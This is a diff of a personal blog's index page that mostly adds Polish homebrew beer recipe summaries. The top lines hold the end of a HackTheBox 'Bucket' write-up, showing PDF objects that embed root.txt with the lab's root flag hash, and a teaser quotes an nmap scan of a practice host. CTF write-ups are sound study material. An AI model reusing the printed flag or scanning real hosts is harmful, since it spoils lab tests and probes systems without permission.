-&gt;&gt;
-stream
-3ba97200d588ae0d517c117a03396f10
-endstream
-endobj
-7 0 obj
-&lt;&lt;
-/Type /Filespec
-/F (root.txt)
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="err">/Type /EmbeddedFile</span>
+<span class="err">/Length 33</span>
+<span class="err">/Params 5 0 R</span>
+<span class="err">&gt;&gt;</span>
+<span class="err">stream</span>
+<span class="err">3ba97200d588ae0d517c117a03396f10</span>
+<span class="err">endstream</span>
+<span class="err">endobj</span>
+<span class="err">7 0 obj</span>
+<span class="err">&lt;&lt;</span>
+<span class="err">/Type /Filespec</span>
+<span class="err">/F (root.txt)</span>
+</code></pre></div>
 
 <p>Yay! See the root flag in the middle?</p></section>
                 <a href="/htb-bucket.html#disqus_thread"></a>
@@ -463,7 +426,7 @@ endobj
                 <p class="uk-article-meta"><time datetime="2020-01-13" itemprop="datePublished">pon 13 stycznia 2020</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
 </p>
                 <p class="uk-article-lead" itemprop="description">Solution to the Bashed VM</p>
-                <p>User flag It is not really necessary to start this one with nmap, but it's never a bad first step root@kali:~# nmap -sS -Pn -sV 10.10.10.68 Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET Nmap scan report for 10.10.10.68 Host is up (0.11s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1...</p>
+                <p>User flag It is not really necessary to start this one with nmap, but it's never a bad first step root@kali:~# nmap -sS -Pn -sV 10.10.10.68 Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET Nmap scan report for 10.10.10.68 Host...</p>
                 <a href="/bashed.html">Read More</a>
                 <hr class="uk-article-divider">
         </article>
@@ -481,12 +444,430 @@ endobj
 
 
         <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/38-farmhouse-v3.html" class="uk-article-title uk-link-muted" itemprop="name">38. Farmhouse v3</a>
+                <p class="uk-article-meta"><time datetime="2018-08-09" itemprop="datePublished">czw 09 sierpnia 2018</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Żytni, jałowcowy farmhouse 12blg, 14l Skład Pilzneński 3,2-4,5 EBC Viking Malt -- 1,5kg Żytni 4-14 EBC Viking Malt 1 kg Oktawia PL 2017 Polish Hops - 15 g granulat 9,2% aa Fermentum Mobile - FM53 Voss Kveik Jałowiec 30g Zacieranie 20 min żyto w 40stopniach, później jednotemperaturowo, infuzyjnie mashout …</p>
+                <p>Żytni, jałowcowy farmhouse 12blg, 14l Skład Pilzneński 3,2-4,5 EBC Viking Malt -- 1,5kg Żytni 4-14 EBC Viking Malt 1 kg Oktawia PL 2017 Polish Hops - 15 g granulat 9,2% aa Fermentum Mobile - FM53 Voss Kveik Jałowiec 30g Zacieranie 20 min żyto w 40stopniach, później jednotemperaturowo, infuzyjnie mashout Chmielenie 15g na 60min jałowiec na 10 ostatnich minut chmielenia Fermentacja Butelkowanie Smak...</p>
+                <a href="/38-farmhouse-v3.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/37-farmhouse-v2.html" class="uk-article-title uk-link-muted" itemprop="name">37. Farmhouse v2</a>
+                <p class="uk-article-meta"><time datetime="2018-07-27" itemprop="datePublished">pią 27 lipca 2018</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Farmhouse 12blg, 14l Skład Pilzneński 3,2-4,5 EBC Viking Malt -- 2,5kg Puławski PL 2017 Polish Hops - 50 g granulat 9,2% aa -- 50g Fermentum Mobile - FM53 Voss Kveik Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie 14g na 60min 20g na 10min 16g na 5min Fermentacja Butelkowanie Smak</p>
+                <p>Farmhouse 12blg, 14l Skład Pilzneński 3,2-4,5 EBC Viking Malt -- 2,5kg Puławski PL 2017 Polish Hops - 50 g granulat 9,2% aa -- 50g Fermentum Mobile - FM53 Voss Kveik Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie 14g na 60min 20g na 10min 16g na 5min Fermentacja Butelkowanie Smak...</p>
+                <a href="/37-farmhouse-v2.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/36-farmhouse-v1.html" class="uk-article-title uk-link-muted" itemprop="name">36. Farmhouse v1</a>
+                <p class="uk-article-meta"><time datetime="2018-07-13" itemprop="datePublished">pią 13 lipca 2018</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Farmhouse 12blg, 10-12l Skład Pilzneński 3,2-4,5 EBC Viking Malt -- 2,5kg Oktawia PL 2017 Polish Hops - 50 g granulat 9,2% aa -- 34g Fermentum Mobile - FM53 Voss Kveik Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie 14g na 60min 20g na 10min Fermentacja Butelkowanie Smak</p>
+                <p>Farmhouse 12blg, 10-12l Skład Pilzneński 3,2-4,5 EBC Viking Malt -- 2,5kg Oktawia PL 2017 Polish Hops - 50 g granulat 9,2% aa -- 34g Fermentum Mobile - FM53 Voss Kveik Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie 14g na 60min 20g na 10min Fermentacja Butelkowanie Smak...</p>
+                <a href="/36-farmhouse-v1.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/33-scottish-ale.html" class="uk-article-title uk-link-muted" itemprop="name">33. Scottish Ale</a>
+                <p class="uk-article-meta"><time datetime="2018-01-26" itemprop="datePublished">pią 26 stycznia 2018</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Scottish Ale, 10blg Skład Pale Ale 5,5-7,5 EBC Weyermann 2 kg Żyto prażone min. 1000 EBC Viking Malt 0,02 kg Wędzony whisky (średni) 15-25 ppm 2,5-3,7 EBC Castle 0.2 kg Challenger UK 2015 - granulat 5,8% aa 14g Fermentum Mobile - FM12 W szkocką kratę …</p>
+                <p>Scottish Ale, 10blg Skład Pale Ale 5,5-7,5 EBC Weyermann 2 kg Żyto prażone min. 1000 EBC Viking Malt 0,02 kg Wędzony whisky (średni) 15-25 ppm 2,5-3,7 EBC Castle 0.2 kg Challenger UK 2015 - granulat 5,8% aa 14g Fermentum Mobile - FM12 W szkocką kratę, starter Zacieranie 11 litrów wody na zacieranie jednotemperaturowo, infuzyjnie palony żyto do zacierania mashout Chmielenie Northdown -- 60min Fermentacja Na razie dwa tygodnie burzliwej, w temperaturze +/-14C, więc niskiej. Butelkowanie Smak...</p>
+                <a href="/33-scottish-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/34-scottish-ale-v2.html" class="uk-article-title uk-link-muted" itemprop="name">34. Scottish Ale v2</a>
+                <p class="uk-article-meta"><time datetime="2018-01-26" itemprop="datePublished">pią 26 stycznia 2018</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Scottish Ale, 13blg Ma to być w zasadzie to samo co poprzednie, ale mocniejsze Skład Pale Ale 5,5-7,5 EBC Weyermann 2,2 kg Żyto prażone min. 1000 EBC Viking Malt 0,02 kg Wędzony whisky (średni) 15-25 ppm 2,5-3,7 EBC Castle 0.35 kg Challenger UK …</p>
+                <p>Scottish Ale, 13blg Ma to być w zasadzie to samo co poprzednie, ale mocniejsze Skład Pale Ale 5,5-7,5 EBC Weyermann 2,2 kg Żyto prażone min. 1000 EBC Viking Malt 0,02 kg Wędzony whisky (średni) 15-25 ppm 2,5-3,7 EBC Castle 0.35 kg Challenger UK 2015 - granulat 5,8% aa 18g Fermentum Mobile - FM12 W szkocką kratę, starter z piany Zacieranie 11 litrów wody na zacieranie jednotemperaturowo, infuzyjnie palony żyto do zacierania mashout Chmielenie Northdown -- 60min Fermentacja Butelkowanie Smak...</p>
+                <a href="/34-scottish-ale-v2.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/35-wee-heavy.html" class="uk-article-title uk-link-muted" itemprop="name">35. Wee Heavy</a>
+                <p class="uk-article-meta"><time datetime="2018-01-20" itemprop="datePublished">sob 20 stycznia 2018</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Scottish Ale, 18blg Trzeci szkot, tym razem najmocniejszy. Jakieś 12l Skład Pale Ale 5,5-7,5 EBC Weyermann 3,8 kg Brown 120-150 EBC Crisp 0,5kg Wędzony whisky (średni) 15-25 ppm 2,5-3,7 EBC Castle 0.5 kg Challenger UK 2015 - granulat 5,8% aa 15g Marynka PL …</p>
+                <p>Scottish Ale, 18blg Trzeci szkot, tym razem najmocniejszy. Jakieś 12l Skład Pale Ale 5,5-7,5 EBC Weyermann 3,8 kg Brown 120-150 EBC Crisp 0,5kg Wędzony whisky (średni) 15-25 ppm 2,5-3,7 EBC Castle 0.5 kg Challenger UK 2015 - granulat 5,8% aa 15g Marynka PL 2015 - szyszki 20g Fermentum Mobile - FM12 W szkocką kratę, starter z gęstwy Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Całość na 60min Fermentacja Ładnie ruszyła. Piwnica 18 stopni. Dorzucę na cichą płatki dębowe w drugim tygodniu. Butelkowanie Smak...</p>
+                <a href="/35-wee-heavy.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/32-nie-pamietam-jaki-stout.html" class="uk-article-title uk-link-muted" itemprop="name">32. Nie-pamiętam-jaki stout</a>
+                <p class="uk-article-meta"><time datetime="2017-11-03" itemprop="datePublished">pią 03 listopada 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Prosty oatmeal stout 12l, 13blg Skład Pale Ale 5,5-7,5 EBC Weyermann 2 kg Jęczmień palony 1100-1200 EBC Weyermann 0,2 kg Brown 120-150 EBC Crisp 0,2kg Northdown UK 2016 - granulat 8,1% aa 20g Safale S04 z gęstwy Zacieranie 9 litrów wody na zacieranie jednotemperaturowo, infuzyjnie palony …</p>
+                <p>Prosty oatmeal stout 12l, 13blg Skład Pale Ale 5,5-7,5 EBC Weyermann 2 kg Jęczmień palony 1100-1200 EBC Weyermann 0,2 kg Brown 120-150 EBC Crisp 0,2kg Northdown UK 2016 - granulat 8,1% aa 20g Safale S04 z gęstwy Zacieranie 9 litrów wody na zacieranie jednotemperaturowo, infuzyjnie palony jęczmień pół na pół: do zacierania i na mashout mashout Chmielenie Northdown -- 60min Fermentacja Chłodzenie przez noc na balkonie Butelkowanie Smak...</p>
+                <a href="/32-nie-pamietam-jaki-stout.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/31-coffe-stout.html" class="uk-article-title uk-link-muted" itemprop="name">31. Coffe stout</a>
+                <p class="uk-article-meta"><time datetime="2017-10-06" itemprop="datePublished">pią 06 października 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Prosty coffe stout 10-12l, 12blg Skład Pale Ale 5,5-7,5 EBC Weyermann 2,5 kg Kawowy 480-520 EBC Castle 0,1 kg Jęczmień palony 1100-1200 EBC Weyermann 0,2 kg Northdown UK 2016 - granulat 8,1% aa 20g Safale S04 z gęstwy Zacieranie 9 litrów wody na zacieranie jednotemperaturowo …</p>
+                <p>Prosty coffe stout 10-12l, 12blg Skład Pale Ale 5,5-7,5 EBC Weyermann 2,5 kg Kawowy 480-520 EBC Castle 0,1 kg Jęczmień palony 1100-1200 EBC Weyermann 0,2 kg Northdown UK 2016 - granulat 8,1% aa 20g Safale S04 z gęstwy Zacieranie 9 litrów wody na zacieranie jednotemperaturowo, infuzyjnie palony jęczmień pół na pół: do zacierania i na mashout mashout Chmielenie Northdown -- 60min Fermentacja Chłodzenie przez noc na balkonie Butelkowanie Smak...</p>
+                <a href="/31-coffe-stout.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/30-brown-porter.html" class="uk-article-title uk-link-muted" itemprop="name">30. Brown porter</a>
+                <p class="uk-article-meta"><time datetime="2017-09-15" itemprop="datePublished">pią 15 września 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekki czekoladowy porter na rozgrzewkę w jesiennym warzeniu. 10-12l Piwo ma w składzie sporo słodu czekoladowego jak na ilość wody. No, zobaczymy jak wyjdzie. Celuję w max 14l, żeby zmieściło się z zapasem do małego fermentora. Planuję fermentować w piwnicy, z cichą rurką z Aliexpress. Skład Brown 120-150 EBC Crisp …</p>
+                <p>Lekki czekoladowy porter na rozgrzewkę w jesiennym warzeniu. 10-12l Piwo ma w składzie sporo słodu czekoladowego jak na ilość wody. No, zobaczymy jak wyjdzie. Celuję w max 14l, żeby zmieściło się z zapasem do małego fermentora. Planuję fermentować w piwnicy, z cichą rurką z Aliexpress. Skład Brown 120-150 EBC Crisp 0,3 kg Czekoladowy Jasny 350-450 EBC Viking Malt 0,2 kg Pale Ale 5,5-7,5 EBC Weyermann 2,5 kg Northdown UK 2016 - granulat 8,1% aa 20g Safale S04 z saszetki Zacieranie 9 litrów wody na zacieranie jednotemperaturowo,...</p>
+                <a href="/30-brown-porter.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/29-oktawia-pale-ale.html" class="uk-article-title uk-link-muted" itemprop="name">29. Oktawia Pale Ale</a>
+                <p class="uk-article-meta"><time datetime="2017-04-28" itemprop="datePublished">pią 28 kwietnia 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekkie piwo (red ale?) na chmielu Oktawia. Planowany jest lekki, bursztynowy ale o umiarkowanie-silnym aromacie z chmielu Oktawia. Powinien wnieść aromaty jabłkowe, zielonego jabłka albo (moim zdaniem) tłoczonego i utlenionego soku jabłkowego. Piwo typowo letnie, grillowe. 22l planowo, 12blg Skład Carared (R) 40-60 EBC Weyermann 0,2 kg Pale Ale …</p>
+                <p>Lekkie piwo (red ale?) na chmielu Oktawia. Planowany jest lekki, bursztynowy ale o umiarkowanie-silnym aromacie z chmielu Oktawia. Powinien wnieść aromaty jabłkowe, zielonego jabłka albo (moim zdaniem) tłoczonego i utlenionego soku jabłkowego. Piwo typowo letnie, grillowe. 22l planowo, 12blg Skład Carared (R) 40-60 EBC Weyermann 0,2 kg Pale Ale 5,5-7,5 EBC Weyermann 5 kg Chmiel Marynka szyszka 17 g Chmiel Oktawia PL 2016 Polish Hops - 50 g granulat 7,8% aa Safale S04 -- gęstwa Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka 17g -- 60min Oktawia 10g --...</p>
+                <a href="/29-oktawia-pale-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/28-smoked-ale-czeresnia.html" class="uk-article-title uk-link-muted" itemprop="name">28. Smoked Ale -- czereśnia</a>
+                <p class="uk-article-meta"><time datetime="2017-03-31" itemprop="datePublished">pią 31 marca 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekkie piwo na 90% zasypie ze słodu wędzonego czereśnią. Mała warka -- 10l 10l planowo, 11blg Skład Jęczmienny Wędzony, Drewno Czereśni max. 10 EBC Viking Malt 2 kg Monachijski Ciemny 19-25 EBC Viking Malt 0.20 kg Chmiel Marynka granulat 10 g Safale S04 Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka - 60min …</p>
+                <p>Lekkie piwo na 90% zasypie ze słodu wędzonego czereśnią. Mała warka -- 10l 10l planowo, 11blg Skład Jęczmienny Wędzony, Drewno Czereśni max. 10 EBC Viking Malt 2 kg Monachijski Ciemny 19-25 EBC Viking Malt 0.20 kg Chmiel Marynka granulat 10 g Safale S04 Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka - 60min Fermentacja Fermentacja gęstwą z #26 Zeszło do 1,2blg (2017-04-22) Butelkowanie 15 butelek, z czego część 0,33l, zaś większość 0,5l. Do refermentacji dodałem 46g cukru białego na 0,3l wody. Zabutelkowane 2017-04-22. Smak Przy butelkowaniu piwo bardzo smaczne. Nie czuję narzucających się problemów, piwo...</p>
+                <a href="/28-smoked-ale-czeresnia.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/27-smoked-ale-wisnia.html" class="uk-article-title uk-link-muted" itemprop="name">27. Smoked Ale -- wiśnia</a>
+                <p class="uk-article-meta"><time datetime="2017-03-24" itemprop="datePublished">pią 24 marca 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekkie piwo na 90% zasypie ze słodu wędzonego gruszą. Mała warka -- 10l 10l planowo, 11blg Skład Jęczmienny Wędzony, Drewno Wiśni max. 10 EBC Viking Malt 2 kg Monachijski Ciemny 19-25 EBC Viking Malt 0.20 kg Chmiel Marynka granulat 10 g Safale S04 Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka - 60min …</p>
+                <p>Lekkie piwo na 90% zasypie ze słodu wędzonego gruszą. Mała warka -- 10l 10l planowo, 11blg Skład Jęczmienny Wędzony, Drewno Wiśni max. 10 EBC Viking Malt 2 kg Monachijski Ciemny 19-25 EBC Viking Malt 0.20 kg Chmiel Marynka granulat 10 g Safale S04 Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka - 60min Fermentacja Z pół saszetki drożdży zrobiłem mini-starter na jakiś 200ml schłodzonego zacieru (przed chmieleniem). Bardzo szybko i zgrabnie ruszyło. Chłodzenie wiadra wodą w garze, finisz na balkonie. Butelkowanie 12 butelek, z czego część 0,33l, zaś większość 0,5l....</p>
+                <a href="/27-smoked-ale-wisnia.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/26-smoked-ale-grusza.html" class="uk-article-title uk-link-muted" itemprop="name">26. Smoked Ale -- grusza</a>
+                <p class="uk-article-meta"><time datetime="2017-03-10" itemprop="datePublished">pią 10 marca 2017</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Lekkie piwo na 90% zasypie ze słodu wędzonego gruszą. Mała warka -- 10l 10l planowo, 11blg Skład Jęczmienny Wędzony, Drewno Gruszy max. 10 EBC Viking Malt 2 kg Monachijski Ciemny 19-25 EBC Viking Malt 0.20 kg Chmiel Marynka granulat 10 g Safale S04 Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka - 60min …</p>
+                <p>Lekkie piwo na 90% zasypie ze słodu wędzonego gruszą. Mała warka -- 10l 10l planowo, 11blg Skład Jęczmienny Wędzony, Drewno Gruszy max. 10 EBC Viking Malt 2 kg Monachijski Ciemny 19-25 EBC Viking Malt 0.20 kg Chmiel Marynka granulat 10 g Safale S04 Zacieranie jednotemperaturowo, infuzyjnie mashout Chmielenie Marynka - 60min Fermentacja Pół saszetki drożdży, zadane w kilka godzin po uwarzeniu (chłodzenie typu balkonowego). Rano już ładnie pracowało. Pierwsza warka fermentująca w 15 litrowym wiadrze z tworzywa. Butelkowanie 21 butelek zakapslowanych 30 marca. Rezerwa wydała mi się podejrzana, więc dodałem...</p>
+                <a href="/26-smoked-ale-grusza.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
                 <a href="/mleko-ryzowe-ale-takie-lepsze.html" class="uk-article-title uk-link-muted" itemprop="name">Mleko ryżowe, ale takie lepsze</a>
                 <p class="uk-article-meta"><time datetime="2017-03-04" itemprop="datePublished">sob 04 marca 2017</time> • <a href="/category/food-pl.html">Food [PL]</a></p>
 </p>
                 <p class="uk-article-lead" itemprop="description">Geneza Wszyscy kiedyś umrzemy, więc jeśli mamy zostawić jakieś dziedzictwo dla przyszłych pokoleń, może ras i gatunków, niech ten przepis będzie moim wkładem w wieczność. Piliście kiedyś mleko ryżowe ze sklepu? Moim zdaniem jest tak smaczne, że krowie może mu co najwyżej possać, ma jednak co najmnej jedną wadę. Tak …</p>
                 <p>Geneza Wszyscy kiedyś umrzemy, więc jeśli mamy zostawić jakieś dziedzictwo dla przyszłych pokoleń, może ras i gatunków, niech ten przepis będzie moim wkładem w wieczność. Piliście kiedyś mleko ryżowe ze sklepu? Moim zdaniem jest tak smaczne, że krowie może mu co najwyżej possać, ma jednak co najmnej jedną wadę. Tak, cenę, która wydaj się być niewspółmierna do składu. Garść ryżu i litr wody za 6-7zł? Krowa musiałaby pewnie wypić tego mleka kilka kartonów, żeby wyprodukować jeden litr...</p>
                 <a href="/mleko-ryzowe-ale-takie-lepsze.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/25-belgian-strong-ale.html" class="uk-article-title uk-link-muted" itemprop="name">25. Belgian strong ale</a>
+                <p class="uk-article-meta"><time datetime="2016-11-29" itemprop="datePublished">wto 29 listopada 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Mocne, aromatyczne piwo na belgijskich drożdżach. Niestety nie zapisałem dokładnej receptury. 20l planowo, ze 18l finalnie, 19-20blg Skład Słód Pilzneński 2,5 - 3,5 EBC Castle 4 kg Słód Abbey 45 EBC Castle 0.80 kg Słód Monachijski Castle 1 kg Słód Special B Castle 200g Słód Special W Castle …</p>
+                <p>Mocne, aromatyczne piwo na belgijskich drożdżach. Niestety nie zapisałem dokładnej receptury. 20l planowo, ze 18l finalnie, 19-20blg Skład Słód Pilzneński 2,5 - 3,5 EBC Castle 4 kg Słód Abbey 45 EBC Castle 0.80 kg Słód Monachijski Castle 1 kg Słód Special B Castle 200g Słód Special W Castle 200g Cukier brązowy trzcinowy 1 kg Chmiel Marynka granulat 30 g Fermentum Mobile - FM26 Belgijskie Pagórki Zacieranie przerwa maltozowa (40 minut) przerwa dekstrynująca (20 minut) mashout Chmielenie Marynka - 60min Fermentacja Starter 1l Butelkowanie...</p>
+                <a href="/25-belgian-strong-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/24-belgian-tripel.html" class="uk-article-title uk-link-muted" itemprop="name">24. Belgian tripel</a>
+                <p class="uk-article-meta"><time datetime="2016-11-20" itemprop="datePublished">nie 20 listopada 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Belgian tripel. Nie ma co wiele gadać, robiony z zestawu z CP: https://www.browar.biz/centrumpiwowarstwa/zestawy_surowcow/redakcyjne_z_zacieraniem/tripel_18_blg 20l planowo, 26l finalnie, 18blg</p>
+                <p>Belgian tripel. Nie ma co wiele gadać, robiony z zestawu z CP: https://www.browar.biz/centrumpiwowarstwa/zestawy_surowcow/redakcyjne_z_zacieraniem/tripel_18_blg 20l planowo, 26l finalnie, 18blg...</p>
+                <a href="/24-belgian-tripel.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/23-belgian-blond-ale.html" class="uk-article-title uk-link-muted" itemprop="name">23. Belgian blond ale</a>
+                <p class="uk-article-meta"><time datetime="2016-10-29" itemprop="datePublished">sob 29 października 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Bardzo klasyczny belgian blond ale. Bez udziwnień i cudów. 20l planowo, ze 26l finalnie, 16blg Skład Słód Pilzneński 2,5 - 3,5 EBC Castle 5 kg Słód Abbey 45 EBC Castle 0.20 kg Słód Cara Blond 20 EBC Castle 1 kg Cukier biały 0,30 kg Miód akacjowy 0 …</p>
+                <p>Bardzo klasyczny belgian blond ale. Bez udziwnień i cudów. 20l planowo, ze 26l finalnie, 16blg Skład Słód Pilzneński 2,5 - 3,5 EBC Castle 5 kg Słód Abbey 45 EBC Castle 0.20 kg Słód Cara Blond 20 EBC Castle 1 kg Cukier biały 0,30 kg Miód akacjowy 0,3kg Chmiel Lubelski (jeszcze z poprzedniego sezonu), granulat 15 g Chmiel Hallertauer Mittelfrüh DE 2015, granulat 50 g Fermentum Mobile - FM26 Belgijskie Pagórki Zacieranie przerwa maltozowa (40 minut) przerwa dekstrynująca (20 minut) mashout Chmielenie Lubelski 15g - 60min Hallertauer Mittelfrüh 50g - 60min Fermentacja Starter 1l,...</p>
+                <a href="/23-belgian-blond-ale.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/22-7-zboz.html" class="uk-article-title uk-link-muted" itemprop="name">22. 7 zbóż</a>
+                <p class="uk-article-meta"><time datetime="2016-05-02" itemprop="datePublished">pon 02 maja 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Piwo bazujące na zestawie 6 zbóż z CP. Nieco zmieniłem recepturę. 25l, 12blg Skład Słód wiedeński 2,20 kg Słód pszeniczny 1,15 kg Słód z pszenicy płaskurki 0,20 kg Słód owsiany 0,20 kg Słód orkiszowy 0,20 kg Słód żytni 0,20 kg Płatki i kasza gryczana …</p>
+                <p>Piwo bazujące na zestawie 6 zbóż z CP. Nieco zmieniłem recepturę. 25l, 12blg Skład Słód wiedeński 2,20 kg Słód pszeniczny 1,15 kg Słód z pszenicy płaskurki 0,20 kg Słód owsiany 0,20 kg Słód orkiszowy 0,20 kg Słód żytni 0,20 kg Płatki i kasza gryczana (pół na pół) 0,30 kg Chmiel Marynka, granulat 15 g Chmiel Lomik, granulat 50 g Zacieranie przerwa ferulowa (10 minut) przerwa beta-glukanowa (10 minut) przerwa maltozowa (30 minut) przerwa dekstrynująca (30 minut) mashout Chmielenie Marynka 15g - 60min Lomik 15g - 60min Lomik 35g - 10min Fermentacja Butelkowanie...</p>
+                <a href="/22-7-zboz.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/21-klasyczna-pszenica.html" class="uk-article-title uk-link-muted" itemprop="name">21. Klasyczna pszenica</a>
+                <p class="uk-article-meta"><time datetime="2016-04-22" itemprop="datePublished">pią 22 kwietnia 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Totalnie klasyczna pszenica z CP. Nawet nie ma co opisywać 24l, 12blg Skład (Z zestawu)[http://www.browar.biz/centrumpiwowarstwa/zestawy_surowcow/redakcyjne_z_zacieraniem/weizenbier_hefeweizen_12_blg] Zacieranie Jak w instrukcji Chmielenie Jak w instrukcji Fermentacja Wystartowało w sobotę 2016-04-23. Bez przelewania na cichą Butelkowanie</p>
+                <p>Totalnie klasyczna pszenica z CP. Nawet nie ma co opisywać 24l, 12blg Skład (Z zestawu)[http://www.browar.biz/centrumpiwowarstwa/zestawy_surowcow/redakcyjne_z_zacieraniem/weizenbier_hefeweizen_12_blg] Zacieranie Jak w instrukcji Chmielenie Jak w instrukcji Fermentacja Wystartowało w sobotę 2016-04-23. Bez przelewania na cichą Butelkowanie...</p>
+                <a href="/21-klasyczna-pszenica.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/20-kundel-wedzone-zyto.html" class="uk-article-title uk-link-muted" itemprop="name">20. Kundel - wędzone żyto</a>
+                <p class="uk-article-meta"><time datetime="2016-03-11" itemprop="datePublished">pią 11 marca 2016</time> • <a href="/category/piwo-pl.html">Piwo [PL]</a></p>
+</p>
